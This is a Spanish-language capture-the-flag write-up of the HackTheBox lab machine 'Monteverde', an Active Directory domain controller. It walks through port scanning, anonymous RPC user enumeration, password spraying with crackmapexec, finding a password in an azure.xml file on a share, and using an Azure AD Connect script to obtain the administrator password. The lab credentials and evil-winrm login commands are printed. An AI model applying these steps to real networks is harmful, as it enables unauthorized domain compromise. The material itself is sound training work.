# Máquina "Monteverde" de HackTheBox

**Características:**

- Windows  
- Active Directory  
- RPC Enumeration 
- Credential Brute Force 
- CrackMapExec 
- Shell Over WinRM 
- Abusing Azure Admins Group 
- Obtaining the administrator's password (Privilege Escalation)

**Útil en:**

- OSCP 
- OSEP 
- Active Directory

**IP:** 10.10.10.172 

## Escaneo inicial

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.172 -oG allPorts
```

```bash
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49673/tcp open  unknown
49702/tcp open  unknown
49771/tcp open  unknown
```

## Escaneo dirigido

```bash
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV 10.10.10.172 -oN targeted
```

```bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-01-18 22:18:09Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: 9m55s
| smb2-security-mode: 
|   2.02:
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-01-18T22:20:26
|_  start_date: N/A
```

## Análisis inicial

Vemos puertos típicos de Windows: DNS (53), Kerberos (88) y LDAP (389), lo que sugiere que podría ser un controlador de dominio.

No parece que pueda conectarme a SMB sin credenciales:

```bash
smbclient -N -L //10.10.10.172
smbmap -H 10.10.10.172 
smbmap -H 10.10.10.172 -u test
```

## Enumeración RPC

Podemos obtener una sesión RPC sin credenciales:

```bash
rpcclient -U "" -N 10.10.10.172
```

Obtenemos una lista de usuarios con descripciones:

```bash
rpcclient $> querydispinfo
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2       Name: AAD_987d7f2f57d2  Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos       Name: Dimitris Galanos  Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope  Name: Mike Hope Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary        Name: Ray O'Leary       Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs    Name: SABatchJobs       Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan        Name: Sally Morgan      Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata        Name: svc-ata   Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec      Name: svc-bexec Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp     Name: svc-netapp        Desc: (null)
```

## Fuerza bruta de credenciales

Creé una lista de usuarios y probé contraseñas con crackmapexec:

```bash
crackmapexec smb 10.10.10.172 -u users -p users --continue-on-success
```

## Enumeración de recursos compartidos

Smbmap muestra los recursos compartidos disponibles:

<img src="/secciones/posts/imagenes/monteverde/reccomp1.webp" alt="Recursos compartidos SMB" width="500">

A través del proceso de eliminación, nos quedamos con el recurso `users$` y encontramos un archivo interesante: `azure.xml` en el directorio de `mhope`:

<img src="/secciones/posts/imagenes/monteverde/azure1.webp" alt="Archivo azure.xml" width="500">

Al examinar el archivo:

<img src="/secciones/posts/imagenes/monteverde/azure2.webp" alt="Contenido de azure.xml" width="500">

## Acceso inicial

Intentamos iniciar sesión usando Evil-WinRM como `mhope` con la contraseña encontrada `4n0therD4y@n0th3r$`:

<img src="/secciones/posts/imagenes/monteverde/winrm1.webp" alt="Conexión Evil-WinRM" width="500">

## Escalada de privilegios

Verificamos los privilegios del usuario:

<img src="/secciones/posts/imagenes/monteverde/winrm2.webp" alt="Privilegios de usuario" width="500">

Cargamos y ejecutamos el script de PowerShell [Azure-ADConnect.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1), revelando más credenciales:

<img src="/secciones/posts/imagenes/monteverde/morecreds1.webp" alt="Credenciales adicionales" width="500">

## Acceso como administrador

Nos conectamos usando Evil-WinRM con el usuario administrador `Administrator` y la contraseña `d0m@in4dminyeah`:

```bash
evil-winrm -i 10.10.10.172 -u Administrator -p 'd0m@in4dminyeah'
```

Buscamos la flag y completamos la máquina.

**Nota:** Algunos de los writeups en esta página pueden tener contenido de otras páginas o tener muy pocas imágenes, esto debido a que en algunas de las máquinas que realicé no tomé los apuntes o no tomé capturas de pantalla. He decidido buscar varios writeups y agregar lo que esté mejor explicado en cada uno para plasmarlo aquí. Si encuentras faltas de ortografía o cualquier error, puedes contactarme a mi correo.